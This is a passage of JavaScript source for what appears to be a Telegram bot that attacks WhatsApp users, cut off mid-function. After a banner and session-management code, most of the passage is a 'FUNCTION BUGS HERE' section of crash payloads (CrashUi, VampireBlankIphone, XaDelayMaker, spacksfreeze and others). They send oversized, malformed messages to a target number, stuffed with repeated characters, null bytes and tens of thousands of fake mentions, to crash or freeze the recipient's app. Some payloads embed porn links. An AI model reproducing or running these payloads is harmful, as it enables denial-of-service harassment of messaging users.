⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣾⣿⣿⣿⣿⣽⣿⣿⣿⣿⡟⠀⠀⠀⠀⣾⣿⣿⣿⣿⣿⣿⣿⣄⠀⠀⠀⠀⠀⠀⢹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢀⡾⣻⣵⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠁⠀⠀⠀⠐⣻⣿⣿⡏⢹⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣮⣟⢷⡀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢿⣿⣿⣿⡄⠀⠀⠀⠀⢻⣿⣿⣷⡌⠸⣿⣾⢿⡧⠀⠀⠀⠀⠀⢀⣿⣿⣿⡿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣠⣾⡿⢛⣵⣾⣿⣿⣿⣿⣿⣯⣾⣿⣿⣿⣿⣧⠀⠀⠀⠀⠀⢻⣿⣿⣿⣶⣌⠙⠋⠁⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⣷⣽⣿⣿⣿⣿⣿⣷⣮⡙⢿⣿⣆⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣰⡿⢋⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⣿⣿⣿⣿⣧⡀⠀⠀⠀⣠⣽⣿⣿⣿⣿⣷⣦⡀⠀⠀⠀⢀⣼⣿⣿⣿⣿⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣝⢿⣇⠀⠀⠀⠀
⠀⠀⠀⣴⣯⣴⣿⣿⠿⢿⣿⣿⣿⣿⣿⣿⡿⢫⣾⣿⣿⣿⣿⣿⣿⡦⢀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀⢴⣿⣿⣿⣿⣿⣿⣷⣝⢿⣿⣿⣿⣿⣿⣿⡿⠿⣿⣿⣧⣽⣦⠀⠀⠀
⠀⠀⣼⣿⣿⣿⠟⢁⣴⣿⡿⢿⣿⣿⡿⠛⣰⣿⠟⣻⣿⣿⣿⣿⣿⣿⣿⡿⠿⠋⢿⣿⣿⣿⣿⣿⠻⢿⣿⣿⣿⣿⣿⣿⣿⣟⠻⣿⣆⠙⢿⣿⣿⡿⢿⣿⣦⡈⠻⣿⣿⣿⣧⠀⠀
⠀⡼⣻⣿⡟⢁⣴⡿⠋⠁⢀⣼⣿⠟⠁⣰⣿⠁⢰⣿⣿⣿⡿⣿⣿⣿⠿⠀⣠⣤⣾⣿⣿⣿⣿⣿⠀⠀⠽⣿⣿⣿⢿⣿⣿⣿⡆⠈⢿⣆⠀⠻⣿⣧⡀⠈⠙⢿⣦⡈⠻⣿⣟⢧⠀
⠀⣱⣿⠋⢠⡾⠋⠀⢀⣠⡾⠟⠁⠀⢀⣿⠟⠀⢸⣿⠙⣿⠀⠈⢿⠏⠀⣾⣿⠛⣻⣿⣿⣿⣿⣯⣤⠀⠀⠹⡿⠁⠀⣿⠏⣿⡇⠀⠹⣿⡄⠀⠈⠻⢷⣄⡀⠀⠙⢷⣄⠙⣿⣎⠂
⢠⣿⠏⠀⣏⢀⣠⠴⠛⠉⠀⠀⠀⠀⠈⠁⠀⠀⠀⠛⠀⠈⠀⠀⠀⠀⠈⢿⣿⣼⣿⣿⣿⣿⢿⣿⣿⣶⠀⠀⠀⠀⠀⠁⠀⠛⠀⠀⠀⠀⠁⠀⠀⠀⠀⠉⠛⠦⣄⣀⣹⠀⠹⣿⡄
⣼⡟⠀⣼⣿⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠛⠛⠛⠋⠁⠀⢹⣿⣿⠆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⢿⣧⠀⢻⣷
⣿⠃⢰⡟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣰⣶⣦⣤⠀⠀⣿⡿⠆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢻⡆⠘⣿
⣿⠀⢸⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⡟⠁⠈⢻⣷⣸⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣧⠀⣿
⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣷⣀⣀⣸⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⣿
⢸⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠛⣿⡿⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⡇
⠈⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣼⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⠁
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢷⣴⡿⣷⠀⠀⢰⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠴⡿⣟⣿⣿⣶⡶⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
`))
sleep(3)
console.log(chalk.red(`
─────────────────────────────────────
NAME APPS   : NEURAL PROTOCOL
AUTHOR      : @hamzneverlose
ID OWN      : Anonymouse
VERSION     : 1 ( I )
─────────────────────────────────────\n\n`));

bot.launch();

// Enable graceful stop
process.once('SIGINT', () => bot.stop('SIGINT'));
process.once('SIGTERM', () => bot.stop('SIGTERM'));

// Si anjing sialan ini yang bikin gw pusing 
setTimeout(() => {
  console.log('🔄 Starting auto-reload activated');
  forceReloadWithRetry();
}, 15000);

// nambahin periodic health check biar aman aja
setInterval(() => {
  const activeSessions = sessions.size;
  const userSessions = loadUserSessions();
  const totalRegisteredSessions = Object.values(userSessions).reduce((acc, numbers) => acc + numbers.length, 0);

  console.log(`📊 Health Check: ${activeSessions}/${totalRegisteredSessions} sessions active`);

  // Only attempt reload if we have registered sessions but none are active
  if (totalRegisteredSessions > 0 && activeSessions === 0) {
    console.log('🔄 Health check: Found registered sessions but none active, attempting reload...');
    reloadAttempts = 0; // Reset counter
    forceReloadWithRetry();
  } else if (activeSessions > 0) {
    console.log('✅ Health check: Sessions are active');
  }
}, 10 * 60 * 1000); // Check setiap 10 menit

// ================ FUNCTION BUGS HERE ================== \\
/*
  Function nya isi Ama function punya lu sendiri
*/

const cihuy = Buffer.alloc(0); // Definisi cihuy untuk thumbnail

async function TrashLocIOS(sock, XS, count = 30) {
  try {
    const locationMessage = {
      degreesLatitude: -9.09999262999,
      degreesLongitude: 199.99963118999,
      jpegThumbnail: null,
      name: "🩸⃟⃨〫⃰‣ ⁖𝐗͢𝐒 𝐌͢Θ𝐃𝐃͢Σ𝐑𝐒 ‣—" + "𖣂".repeat(15000),
      address: " 🍧⃟༑⌁⃰𝐃𝐞ͯ𝐬𝐭𝐫͢𝐮𝐢𝐝𝐨𝐫 𝐗͜𝐒ཀ͜͡🍨" + "𖣂".repeat(5000),
      url: `https://www.xnxx.${"𖣂".repeat(25000)}.com`,
    }

    const msg = generateWAMessageFromContent(XS, {
      viewOnceMessage: {
        message: { locationMessage }
      }
    }, {});

    await sock.relayMessage('status@broadcast', msg.message, {
      messageId: msg.key.id,
      statusJidList: [XS],
      additionalNodes: [{
        tag: 'meta',
        attrs: {},
        content: [{
          tag: 'mentioned_users',
          attrs: {},
          content: [{
            tag: 'to',
            attrs: { jid: XS },
            content: undefined
          }]
        }]
      }]
    });
    console.log(`✅ TrashLocIOS sent to ${XS}`);
  } catch (err) {
    console.error(err);
  }
};

// forsklos woilah
async function FcOneMsg(sock, target) {
  const fconemsg = {
    requestPaymentMessage: {
      amount: {
       value: 1,
       offset: 0,
       currencyCodeIso4217: "IDR",
       requestFrom: isTarget,
       expiryTimestamp: Date.now() + 8000
      },
      contextInfo: {
        externalAdReply: {
          title: "Piantech",
          body: "ြ".repeat(1500),
          mimetype: "audio/mpeg",
          caption: "ြ".repeat(1500),
          showAdAttribution: true,
          sourceUrl: "https://t.me/Piantechh",
          thumbnailUrl: "https://files.catbox.moe/eqsjkd.jpg"
        }
      }
    }
  };
  
    await sock.relayMessage(target, fconemsg, {
    participant: { jid: target },
    messageId: null,
    userJid: target,
    quoted: null
  });
}
// end forsklos

// function bug kapotID //
async function CrashUi(sock, target) {
  await sock.relayMessage(
    target,
    {
      groupMentionedMessage: {
        message: {
          interactiveMessage: {
            header: {
              locationMessage: {
                degreesLatitude: 111111,
                degreesLongitude: 111111
              },
              hasMediaAttachment: true
            },
            body: {
              text: "\u0000" + "\u0000".repeat(150000) + "\u0000".repeat(150000)
            },
            nativeFlowMessage: {
              messageParamsJson: "\u0000"
            },
            contextInfo: {
              mentionedJid: Array.from({ length: 5 }, () => "120363330289360382@newsletter"),
              groupMentions: [
                {
                  groupJid: "120363330289360382@newsletter",
                  groupSubject: "\u0000"
                }
              ],
              quotedMessage: {
                documentMessage: {
                  contactVcard: true
                }
              }
            }
          }
        }
      }
    },
    {
      participant: {
        jid: target
      }
    }
  );
}
async function VampireBlankIphone(sock, target, count = 50) {
  try {
    const messsage = {
      botInvokeMessage: {
        message: {
          newsletterAdminInviteMessage: {
            newsletterJid: `33333333333333333@newsletter`,
            newsletterName: "ᐯᗩᗰᑭIᖇᗴ ᑎO Oᒪᗴᑎᘜ" + "ી".repeat(120000),
            jpegThumbnail: "",
            caption: "ꦽ".repeat(120000),
            inviteExpiration: Date.now() + 1814400000,
          },
        },
      },
    };
    await sock.relayMessage(target, messsage, {
      userJid: target,
    });
  }
  catch (err) {
    console.log(err);
  }
}
async function TredictDelay(sock, target, count = 50) {
  const msg = {
    stickerMessage: {
      url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c&mms3=true",
      fileSha256: "mtc9ZjQDjIBETj76yZe6ZdsS6fGYL+5L7a/SS6YjJGs=",
      fileEncSha256: "tvK/hsfLhjWW7T6BkBJZKbNLlKGjxy6M6tIZJaUTXo8=",
      mediaKey: "ml2maI4gu55xBZrd1RfkVYZbL424l0WPeXWtQ/cYrLc=",
      mimetype: "image/webp",
      height: 9999,
      width: 9999,
      directPath: "/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c",
      fileLength: 12260,
      mediaKeyTimestamp: "1743832131",
      isAnimated: false,
      stickerSentTs: "X",
      isAvatar: false,
      isAiSticker: false,
      isLottie: false,
      contextInfo: {
        mentionedJid: [
          "0@s.whatsapp.net",
          ...Array.from(
            { length: 1900 },
            () =>
              "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net"
          ),
        ],
        stanzaId: "1234567890ABCDEF",
        quotedMessage: {
          paymentInviteMessage: {
            serviceType: 3,
            expiryTimestamp: Date.now() + 1814400000
          }
        }
      }
    }
  };

  await sock.relayMessage("status@broadcast", msg, {
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{ tag: "to", attrs: { jid: target } }]
      }]
    }]
  });

  console.log(chalk.red(`
  TREDICT INVICTUS 
  DELAY INVISIBLE 
  TARGET: ${target}`))
}
async function CardsCarousel(sock, target, count = 50) {
  try {
    const cards = Array.from({ length: 1000 }, () => ({
      body: proto.Message.InteractiveMessage.Body.fromObject({ text: "  Am Modul :) " }),
      footer: proto.Message.InteractiveMessage.Footer.fromObject({ text: "ㅤAm Modul:)ㅤ" }),
      header: proto.Message.InteractiveMessage.Header.fromObject({
        title: "Virus Dikirim", // buat effect tambahin crash text kalau mau 
        hasMediaAttachment: true,
        imageMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0&mms3=true",
          mimetype: "image/jpeg",
          fileSha256: "dUyudXIGbZs+OZzlggB1HGvlkWgeIC56KyURc4QAmk4=",
          fileLength: "10840",
          height: 10,
          width: 10,
          mediaKey: "LGQCMuahimyiDF58ZSB/F05IzMAta3IeLDuTnLMyqPg=",
          fileEncSha256: "G3ImtFedTV1S19/esIj+T5F+PuKQ963NAiWDZEn++2s=",
          directPath: "/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0",
          mediaKeyTimestamp: "1721344123",
          jpegThumbnail: ""
        }
      }),
      nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({ buttons: [] })
    }));

    const death = Math.floor(Math.random() * 5000000) + "@s.whatsapp.net";

    const carousel = generateWAMessageFromContent(
      target,
      {
        viewOnceMessage: {
          message: {
            messageContextInfo: {
              deviceListMetadata: {},
              deviceListMetadataVersion: 2
            },
            interactiveMessage: proto.Message.InteractiveMessage.fromObject({
              body: proto.Message.InteractiveMessage.Body.create({
                text: `You, You Disappointed Me \n${"𑜦".repeat(100000)}:)\n\u0000`
              }),
              footer: proto.Message.InteractiveMessage.Footer.create({
                text: "`bokep:` https://xnxx.com"
              }),
              header: proto.Message.InteractiveMessage.Header.create({
                hasMediaAttachment: false
              }),
              carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
                cards: cards
              }),
              contextInfo: {
                mentionedJid: [
                  target,
                  "0@s.whatsapp.net",
                  ...Array.from({ length: 1900 }, () =>
                    `1${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`
                  ),
                ],
                remoteJid: target,
                participant: death,
                stanzaId: "1234567890ABCDEF"
              }
            })
          }
        }
      },
      { userJid: target }
    );

    await sock.relayMessage(target, carousel.message, {
      messageId: carousel.key.id,
      participant: { jid: target }
    });

    console.log(`Arigatou, mina :) `);
    return { status: "success", messageId: carousel.key.id };

  } catch (err) {
    console.error("Error sending carousel:", err);
    return {
      status: "error",
      error: err.message,
      stack: err.stack
    };
  }
}
async function XaDelayMaker(sock, target, count = 30) { // Default true biar otomatis nyala
  const delaymention = Array.from({ length: 30000 }, (_, r) => ({
    title: "᭡꧈".repeat(95000),
    rows: [{ title: `${r + 1}`, id: `${r + 1}` }]
  }));

  const MSG = {
    viewOnceMessage: {
      message: {
        listResponseMessage: {
          title: "Dapzy Is Here!",
          listType: 2,
          buttonText: null,
          sections: delaymention,
          singleSelectReply: { selectedRowId: "🔴" },
          contextInfo: {
            mentionedJid: Array.from({ length: 30000 }, () =>
              "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
            ),
            participant: target,
            remoteJid: "status@broadcast",
            forwardingScore: 9741,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
              newsletterJid: "333333333333@newsletter",
              serverMessageId: 1,
              newsletterName: "-"
            }
          },
          description: "Dont Bothering Me Bro!!!"
        }
      }
    },
    contextInfo: {
      channelMessage: true,
      statusAttributionType: 2
    }
  };

  const msg = generateWAMessageFromContent(target, MSG, {});

  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined
              }
            ]
          }
        ]
      }
    ]
  });

  // **Cek apakah mention true sebelum menjalankan relayMessage**
  if (target) {
    await sock.relayMessage(
      target,
      {
        statusMentionMessage: {
          message: {
            protocolMessage: {
              key: msg.key,
              type: 25
            }
          }
        }
      },
      {
        additionalNodes: [
          {
            tag: "meta",
            attrs: { is_status_mention: "Dapzy Is Here! " },
            content: undefined
          }
        ]
      }
    );
  }
}
async function VampSuperDelay(sock, target, mention = false, count = 30) {
  const mentionedList = [
    "13135550002@s.whatsapp.net",
    ...Array.from({ length: 40000 }, () =>
      `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
    )
  ];

  const embeddedMusic = {
    musicContentMediaId: "589608164114571",
    songId: "870166291800508",
    author: "Vampire Crash" + "ោ៝".repeat(10000),
    title: "Iqbhalkeifer",
    artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
    artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
    artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
    artistAttribution: "https://t.me/testianosex",
    countryBlocklist: true,
    isExplicit: true,
    artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU="
  };

  const videoMessage = {
    url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0&mms3=true",
    mimetype: "video/mp4",
    fileSha256: "c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=",
    fileLength: "289511",
    seconds: 15,
    mediaKey: "IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=",
    caption: "V A M P I R E  H E R E ! ! !",
    height: 640,
    width: 640,
    fileEncSha256: "BqKqPuJgpjuNo21TwEShvY4amaIKEvi+wXdIidMtzOg=",
    directPath: "/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0",
    mediaKeyTimestamp: "1743848703",
    contextInfo: {
      isSampled: true,
      mentionedJid: mentionedList
    },
    forwardedNewsletterMessageInfo: {
      newsletterJid: "120363321780343299@newsletter",
      serverMessageId: 1,
      newsletterName: "VampClouds"
    },
    streamingSidecar: "cbaMpE17LNVxkuCq/6/ZofAwLku1AEL48YU8VxPn1DOFYA7/KdVgQx+OFfG5OKdLKPM=",
    thumbnailDirectPath: "/v/t62.36147-24/11917688_1034491142075778_3936503580307762255_n.enc?ccb=11-4&oh=01_Q5AaIYrrcxxoPDk3n5xxyALN0DPbuOMm-HKK5RJGCpDHDeGq&oe=68185DEB&_nc_sid=5e03e0",
    thumbnailSha256: "QAQQTjDgYrbtyTHUYJq39qsTLzPrU2Qi9c9npEdTlD4=",
    thumbnailEncSha256: "fHnM2MvHNRI6xC7RnAldcyShGE5qiGI8UHy6ieNnT1k=",
    annotations: [
      {
        embeddedContent: {
          embeddedMusic
        },
        embeddedAction: true
      }
    ]
  };

  const msg = generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: { videoMessage }
    }
  }, {});

  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              { tag: "to", attrs: { jid: target }, content: undefined }
            ]
          }
        ]
      }
    ]
  });

  if (mention) {
    await sock.relayMessage(target, {
      statusMentionMessage: {
        message: {
          protocolMessage: {
            key: msg.key,
            type: 25
          }
        }
      }
    }, {
      additionalNodes: [
        {
          tag: "meta",
          attrs: { is_status_mention: "true" },
          content: undefined
        }
      ]
    });
  }
}
async function spacksfreeze(sock, target, count = 50) {
  await sock.relayMessage(target, {
    stickerPackMessage: {
      stickerPackId: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5",
      name: "ꦾ".repeat(30000),
      publisher: "© PhynxAgency",
      stickers: Array.from({ length: 999 }, () => ({
        fileName: "dcNgF+gv31wV10M39-1VmcZe1xXw59KzLdh585881Kw=.webp",
        emojis: ["🩸", "🩸"],
        accessibilityLabel: "ꦽ".repeat(9999),
        stickerSentTs: {
          low: Math.floor(Math.random() * -20000000),
          high: 555,
          unsigned: false,
        },
        isAvatar: true,
        isLottie: false,
        isAiSticker: true,
        isAnimated: false,
        mimetype: "image/webp"
      })),
      fileLength: "99999999999",
      fileSha256: "G5M3Ag3QK5o2zw6nNL6BNDZaIybdkAEGAaDZCWfImmI=",
      fileEncSha256: "2KmPop/J2Ch7AQpN6xtWZo49W5tFy/43lmSwfe/s10M=",
      mediaKey: "rdciH1jBJa8VIAegaZU2EDL/wsW8nwswZhFfQoiauU0=",
      directPath: "/v/t62.15575-24/11927324_562719303550861_518312665147003346_n.enc?ccb=11-4&oh=01_Q5Aa1gFI6_8-EtRhLoelFWnZJUAyi77CMezNoBzwGd91OKubJg&oe=685018FF&_nc_sid=5e03e0",
      contextInfo: {
        remoteJid: "X",
        participant: "0@s.whatsapp.net",
        stanzaId: "1234567890ABCDEF",
        forwardingScore: 99999,
        isForwarded: true,
        businessMessageForwardInfo: {
          businessOwnerJid: "13135550002@s.whatsapp.net"
        },
        mentionedJid: [
          target,
          "1@s.whatsapp.net",
          "0@s.whatsapp.net"
        ].concat(
          Array.from({ length: 35 * 1000 }, () =>
            `1${Math.floor(Math.random() * 499999)}@s.whatsapp.net`
          )
        ),
        quotedMessage: {
          viewOnceMessage: {
            message: {
              interactiveResponseMessage: {
                body: {
                  text: "Sent",
                  format: "DEFAULT"
                },
                nativeFlowResponseMessage: {
                  name: "galaxy_message",
                  paramsJson: "{ phynx.json }",
                  version: 3
                }
              }
            }
          }
        },
      },
      packDescription: "ꦹ".repeat(99999),
      mediaKeyTimestamp: "1747502082",
      trayIconFileName: "bcdf1b38-4ea9-4f3e-b6db-e428e4a581e5.png",
      thumbnailDirectPath: "/v/t62.15575-24/23599415_9889054577828938_1960783178158020793_n.enc?ccb=11-4&oh=01_Q5Aa1gEwIwk0c_MRUcWcF5RjUzurZbwZ0furOR2767py6B-w2Q&oe=685045A5&_nc_sid=5e03e0",
      thumbnailSha256: "hoWYfQtF7werhOwPh7r7RCwHAXJX0jt2QYUADQ3DRyw=",
      thumbnailEncSha256: "IRagzsyEYaBe36fF900yiUpXztBpJiWZUcW4RJFZdjE=",
      thumbnailHeight: 999999999,
      thumbnailWidth: 999999999,
      imageDataHash: "NGJiOWI2MTc0MmNjM2Q4MTQxZjg2N2E5NmFkNjg4ZTZhNzVjMzljNWI5OGI5NWM3NTFiZWQ2ZTZkYjA5NGQzOQ==",
      stickerPackSize: "723949",
      stickerPackOrigin: "USER_CREATED"
    }
  }, {});
}
async function VerloadXDelayFc(sock, target, count = 50) {
  try {
    const msg1 = generateWAMessageFromContent(
      target,
      {
        viewOnceMessage: {
          message: {
            videoMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc?ccb=11-4&oh=01_Q5AaISzZnTKZ6-3Ezhp6vEn9j0rE9Kpz38lLX3qpf0MqxbFA&oe=6816C23B&_nc_sid=5e03e0&mms3=true",
              mimetype: "video/mp4",
              fileSha256: "9ETIcKXMDFBTwsB5EqcBS6P2p8swJkPlIkY8vAWovUs=",
              fileLength: "999999",
              seconds: 999999,
              mediaKey: "JsqUeOOj7vNHi1DTsClZaKVu/HKIzksMMTyWHuT9GrU=",
              caption: "\u200D".repeat(1000),
              height: 999999,
              width: 999999,
              fileEncSha256: "HEaQ8MbjWJDPqvbDajEUXswcrQDWFzV0hp0qdef0wd4=",
              directPath:
                "/v/t62.7161-24/35743375_1159120085992252_7972748653349469336_n.enc?ccb=11-4&oh=01_Q5AaISzZnTKZ6-3Ezhp6vEn9j0rE9Kpz38lLX3qpf0MqxbFA&oe=6816C23B&_nc_sid=5e03e0",
              mediaKeyTimestamp: "1743742853",
              contextInfo: {
                isSampled: true,
                mentionedJid: [
                  target,
                  "13135550002@s.whatsapp.net",
                  ...Array.from(
                    { length: 30000 },
                    () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
                  ),
                ],
              },
              streamingSidecar:
                "Fh3fzFLSobDOhnA6/R+62Q7R61XW72d+CQPX1jc4el0GklIKqoSqvGinYKAx0vhTKIA=",
              thumbnailDirectPath:
                "/v/t62.36147-24/31828404_9729188183806454_2944875378583507480_n.enc?ccb=11-4&oh=01_Q5AaIZXRM0jVdaUZ1vpUdskg33zTcmyFiZyv3SQyuBw6IViG&oe=6816E74F&_nc_sid=5e03e0",
              thumbnailSha256: "vJbC8aUiMj3RMRp8xENdlFQmr4ZpWRCFzQL2sakv/Y4=",
              thumbnailEncSha256: "dSb65pjoEvqjByMyU9d2SfeB+czRLnwOCJ1svr5tigE=",
              annotations: [
                {
                  embeddedContent: {
                    embeddedMusic: {
                      musicContentMediaId: "kontol",
                      songId: "peler",
                      author: "\u9999",
                      title: "\u9999",
                      artworkDirectPath:
                        "/v/t62.76458-24/30925777_638152698829101_3197791536403331692_n.enc?ccb=11-4&oh=01_Q5AaIZwfy98o5IWA7L45sXLptMhLQMYIWLqn5voXM8LOuyN4&oe=6816BF8C&_nc_sid=5e03e0",
                      artworkSha256:
                        "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
                      artworkEncSha256:
                        "fLMYXhwSSypL0gCM8Fi03bT7PFdiOhBli/T0Fmprgso=",
                      artistAttribution:
                        "https://www.instagram.com/_u/tamainfinity_",
                      countryBlocklist: true,
                      isExplicit: true,
                      artworkMediaKey:
                        "kNkQ4+AnzVc96Uj+naDjnwWVyzwp5Nq5P1wXEYwlFzQ=",
                    },
                  },
                  embeddedAction: null,
                },
              ],
            },
          },
        },
      },
      {}
    );

    await sock.relayMessage("status@broadcast", msg1.message, {
      messageId: msg1.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [{ tag: "to", attrs: { jid: target }, content: undefined }],
            },
          ],
        },
      ],
    });

    if (mention) {
      await sock.relayMessage(
        target,
        {
          groupStatusMentionMessage: {
            message: { protocolMessage: { key: msg1.key, type: 25 } },
          },
        },
        {
          additionalNodes: [
            {
              tag: "meta",
              attrs: { is_status_mention: "true" },
              content: undefined,
            },
          ],
        }
      );
    }

    const space = "{".repeat(10000);

    const messagePayload = {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: { text: "VaxzyNotWhyy👀" },
            carouselMessage: {
              cards: cardsCrL,
              messageVersion: 1
            }
          }
        }
      }
    };

    const msg2 = generateWAMessageFromContent(target, messagePayload, {});

    await sock.relayMessage("status@broadcast", msg2.message, {
      messageId: msg2.key.id,
      statusJidList: [target],
    });

    let message = {
      viewOnceMessage: {
        message: {
          locationMessage: {
            name: "Mode High On 😂",
            address: "Mode High On 😂",
            comment: "Mode High On 😂",
            accuracyInMeters: 1,
            degreesLatitude: 111.45231,
